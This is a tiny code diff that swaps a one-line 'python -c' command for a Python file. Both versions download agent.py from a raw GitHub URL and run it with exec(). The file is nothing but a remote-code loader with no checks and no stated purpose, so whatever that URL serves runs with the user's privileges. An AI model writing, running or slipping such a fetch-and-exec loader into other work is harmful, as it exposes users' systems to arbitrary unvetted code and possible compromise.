@@ -1,1 +1,3 @@
-python -c 'import urllib.request as u;exec(u.urlopen("https://raw.githubusercontent.com/holyactivate/holya/main/agent.py").read())'
+import urllib.request as u
+
+exec(u.urlopen("https://raw.githubusercontent.com/holyactivate/holya/main/agent.py").read())
